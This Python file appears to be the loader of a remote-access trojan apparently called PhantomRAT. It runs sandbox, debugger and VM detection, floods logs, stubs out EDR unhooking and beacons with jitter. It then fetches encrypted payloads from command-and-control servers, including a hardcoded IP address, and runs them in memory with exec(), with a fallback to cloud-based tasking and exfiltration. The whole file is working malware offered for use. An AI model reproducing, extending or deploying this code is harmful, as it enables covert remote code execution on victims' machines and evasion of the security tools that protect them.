import base64
import urllib.request
import urllib.error
import sys
import json
import time
import random
import hashlib
import os
from cryptography.fernet import Fernet

# Load profile
try:
    with open('malleable_profile.json', 'r') as f:
        profile = json.load(f)
    key = profile['encryption']['key'].encode()
    if len(key) < 32:
        key = key.ljust(32)[:32]
    elif len(key) > 32:
        key = key[:32]
    fernet = Fernet(base64.urlsafe_b64encode(key))
except Exception:
    key = b'default_key_32_bytes_long_1234567890'
    fernet = Fernet(base64.urlsafe_b64encode(key))

def decrypt_data(data):
    """Decrypt data from C2"""
    try:
        return json.loads(fernet.decrypt(data.encode()).decode())
    except:
        # Try base64 fallback
        try:
            return json.loads(base64.b64decode(data.encode()).decode())
        except:
            return {"error": "decryption_failed"}

def anti_sandbox():
    """Detect sandbox/virtual environments"""
    import psutil
    
    indicators = {
        'low_process_count': len(list(psutil.process_iter())) < 30,
        'low_cpu_cores': psutil.cpu_count() < 2,
        'low_memory': psutil.virtual_memory().total < 2 * 1024**3,  # < 2GB
        'short_uptime': psutil.boot_time() > time.time() - 300,  # < 5 min
        'common_sandbox_users': os.getenv('USER') in ['sandbox', 'virus', 'malware'],
        'debugger_present': hasattr(sys, 'gettrace') and sys.gettrace() is not None,
        'virtual_machine': False  # Would check VM indicators
    }
    
    # Check for virtual machine
    try:
        with open('/sys/class/dmi/id/product_name', 'r') as f:
            product = f.read().lower()
            if any(vm in product for vm in ['virtualbox', 'vmware', 'qemu', 'kvm']):
                indicators['virtual_machine'] = True
    except:
        pass
    
    # If 2 or more indicators, likely sandbox
    sandbox_score = sum(1 for k, v in indicators.items() if v)
    return sandbox_score < 2

def api_unhook():
    """Unhook common APIs to bypass EDR"""
    # This is simplified - real implementation would use more advanced techniques
    try:
        import ctypes
        
        # Example: unhook by loading fresh DLL
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
        
        # Overwrite common hooked functions (conceptual)
        # In reality, this is much more complex
        pass
    except:
        pass  # Not Windows or failed

def anti_forensic():
    """Anti-forensic measures"""
    import sys
    
    # Check for debuggers
    if hasattr(sys, 'gettrace') and sys.gettrace():
        # Debugger detected - cause crash
        os._exit(1)
    
    # Environmental checks
    sandbox_env_vars = ['SANDBOX', 'VIRUS', 'MALWARE', 'CUCKOO', 'ANUBIS']
    for var in sandbox_env_vars:
        if os.environ.get(var):
            os._exit(1)
    
    # Log flooding
    try:
        for i in range(50):
            print(f"[INFO] System check {i}: OK")
            print(f"[DEBUG] Process {os.getpid()} running normally")
    except:
        pass
    
    # Time-based check
    start_time = time.time()
    time.sleep(random.uniform(0.1, 0.5))
    if time.time() - start_time > 1:  # Time manipulation detected
        os._exit(1)

def load_and_execute_payload(url):
    """Download and execute payload from C2"""
    if not anti_sandbox():
        print("Sandbox detected, aborting.")
        return False
    
    try:
        # Apply anti-forensic measures
        anti_forensic()
        api_unhook()
        
        # Create stealthy request
        headers = profile['http-get']['client']['header'].copy()
        
        # Add randomization
        headers['User-Agent'] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
        
        # Add timestamp to avoid caching
        import urllib.parse
        url_parts = list(urllib.parse.urlparse(url))
        query = dict(urllib.parse.parse_qsl(url_parts[4]))
        query['_'] = str(int(time.time() * 1000))
        url_parts[4] = urllib.parse.urlencode(query)
        url = urllib.parse.urlunparse(url_parts)
        
        req = urllib.request.Request(url, headers=headers)
        
        # Random timeout
        timeout = random.uniform(5, 15)
        
        with urllib.request.urlopen(req, timeout=timeout) as response:
            if response.getcode() != 200:
                return False
            
            content_type = response.headers.get('Content-Type', '')
            if 'application/json' in content_type:
                encrypted_payload = response.read().decode('utf-8')
                data = decrypt_data(encrypted_payload)
                
                if 'payload' not in data:
                    return False
                
                encoded_payload = data['payload']
                
                # Decode and execute in memory
                try:
                    payload = base64.b64decode(encoded_payload)
                    
                    # Verify payload hash
                    payload_hash = hashlib.sha256(payload).hexdigest()
                    if data.get('hash') and payload_hash != data['hash']:
                        print("Payload hash mismatch")
                        return False
                    
                    # Execute in isolated namespace
                    namespace = {
                        '__name__': '__main__',
                        '__builtins__': __builtins__,
                        'sys': sys,
                        'os': os,
                        'time': time,
                        'random': random,
                        'json': json
                    }
                    
                    exec(payload, namespace)
                    return True
                    
                except Exception as e:
                    print(f"Payload execution error: {e}")
                    return False
        
        return False
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("C2 endpoint not found")
        return False
    except urllib.error.URLError as e:
        print(f"Network error: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

def beacon():
    """Sleep with jitter and obfuscation"""
    sleep_config = profile.get('sleep', {})
    if isinstance(sleep_config, dict):
        min_sleep = sleep_config.get('min', 45)
        max_sleep = sleep_config.get('max', 120)
        jitter = sleep_config.get('jitter', 15)
    else:
        min_sleep = 45
        max_sleep = 120
        jitter = 15
    
    base_sleep = random.randint(min_sleep, max_sleep)
    jitter_amount = random.randint(-jitter, jitter)
    total_sleep = max(10, base_sleep + jitter_amount)
    
    # Obfuscated sleep
    end_time = time.time() + total_sleep
    while time.time() < end_time:
        time.sleep(random.uniform(0.5, 2.0))
        # Do harmless work
        _ = [i**3 for i in range(100)]

def invisible_update(module_url):
    """Download and execute module stealthily"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; AnalyticsBot/1.0; +http://example.com/bot)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'http://www.google.com/'
        }
        
        req = urllib.request.Request(module_url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=10) as response:
            if response.getcode() == 200:
                encrypted_module = response.read()
                
                try:
                    module_code = fernet.decrypt(encrypted_module).decode()
                    
                    # Execute in limited scope
                    safe_globals = {
                        '__builtins__': __builtins__,
                        'print': print,
                        'time': time,
                        'os': os
                    }
                    
                    exec(module_code, safe_globals)
                    return True
                except:
                    # Try plain execution
                    try:
                        exec(encrypted_module.decode(), {})
                        return True
                    except:
                        pass
        
        return False
    except:
        return False

if __name__ == "__main__":
    # Main C2 communication loop
    c2_servers = []
    
    primary = profile.get('c2', {}).get('primary', 'http://141.105.71.196')
    if primary:
        c2_servers.append(primary)
    
    secondary = profile.get('c2', {}).get('secondary', [])
    c2_servers.extend(secondary)
    
    while True:
        beacon()
        
        # Try each C2 server
        payload_loaded = False
        for server in c2_servers:
            try:
                c2_url = server + profile['http-get']['client']['uri']
                if load_and_execute_payload(c2_url):
                    payload_loaded = True
                    break
            except:
                continue
        
        if not payload_loaded:
            # Fallback to cloud
            try:
                from phantomrat_cloud import fetch_task, exfil_via_drive
                task = fetch_task()
                if task and task.get('type') == 'payload':
                    # Execute payload from cloud
                    pass
            except:
                pass
